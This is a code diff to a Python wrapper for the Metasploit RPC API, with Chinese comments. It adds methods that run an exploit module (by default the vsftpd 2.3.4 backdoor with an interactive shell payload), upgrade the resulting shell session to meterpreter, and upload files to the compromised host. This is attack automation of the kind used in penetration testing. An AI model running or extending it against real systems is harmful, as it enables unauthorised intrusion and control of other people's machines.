@@ -78,6 +78,7 @@ class Metasploit:
 
         # console id列表
         self.consoles: List[str] = []
+        self.sessions = None  # 存储所有的session会话
 
     def __init_consoles(self):
         """
@@ -156,4 +157,98 @@ class Metasploit:
         # 返回命令输出结果
         if only_data:
             return result.get("data")
+        return result
+
+    def upload(self,
+               id: int,
+               origin: str,
+               src: str,
+               ):
+        """
+        上传文件到受控主机
+        :param id: meterprter的ID，是一个session id
+        :param origin: 部署msf服务的服务器上文件的路径，暂时不支持传本地文件
+        :param src: 受控主机上的文件路径
+        :return:
+        """
+        # 更新sessions
+        if self.sessions is None:
+            self.sessions = self.call("session.list")
+        if self.sessions is None:
+            raise NotfoundError("未发现可用的session")
+
+        # 判断类型
+        meterpreter = self.sessions.get(id, None)
+        if meterpreter is None:
+            raise NotfoundError("该meterpreter不存在")
+        if meterpreter.get('type') != "meterpreter":
+            raise ParamError("该session不是一个meterpreter")
+
+        # 使用该meterpreter上传文件
+        options = [id, f"upload {origin} {src}"]
+        self.log.debug(self.call("session.meterpreter_write", options))
+        result = self.call("session.meterpreter_read", id)
+        self.log.debug(result)
+
+        # 返回结果
+        return result
+
+    def use(self,
+            module_type: str = "exploit",
+            module_name: str = "unix/ftp/vsftpd_234_backdoor",
+            rhosts: str = None,
+            payload: str = "cmd/unix/interact",
+            **kwargs,
+            ):
+        """
+        使用一个模块
+        :return:
+        """
+        # 准备参数
+        opts = {}
+        if rhosts:
+            opts["RHOSTS"] = rhosts
+        if payload:
+            opts["payload"] = payload
+        if len(kwargs):
+            opts.extend(kwargs)
+        params = [module_type, module_name, opts]
+
+        # 执行模块
+        result = self.call("module.execute", params)
+        if not (result.get("job_id") and result.get("uuid")):
+            raise InternalError(f"执行模块失败：{result}")
+
+        return result
+
+    def create_meterpreter(self,
+                           session_id: int = None,
+                           lhosts: str = "0.0.0.0",
+                           lport: int = 18888,
+                           ):
+        """
+        创建一个meterpreter
+        :return:
+        """
+        # 没有传session id，默认取sessions中id最大的那个（最新创建的）
+        if session_id is None:
+            # 获取sessions
+            self.sessions = self.call("session.list")
+            if not self.sessions:
+                raise NotfoundError("没有可用的session")
+            max_session_id = max(list(self.sessions.keys()))
+
+            # 获取session
+            session = self.sessions.get(max_session_id)
+            if not session:
+                raise NotfoundError("该session不可用")
+
+            session_id = max_session_id
+
+        # session升级为meterpreter
+        options = [session_id, lhosts, lport]
+        result = self.call("session.shell_upgrade", options)
+        self.log.debug(f"session升级为meterpreter：{result}")
+
+        # 返回结果
         return result
